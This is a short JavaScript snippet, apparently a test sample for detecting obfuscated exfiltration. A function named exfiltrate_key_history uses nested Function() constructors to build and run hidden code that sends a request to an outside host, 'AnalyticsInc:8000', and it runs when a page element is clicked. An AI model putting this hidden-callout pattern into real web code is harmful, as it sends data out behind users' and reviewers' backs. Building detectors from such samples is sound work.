function exfiltrate_key_history() {
  var nest = 'var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest3", true);xmlhttp.send(null);\';return Function(exp);';
  var v2 = Function(nest);
  var v0 = v2();
  v0();
  return
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history;
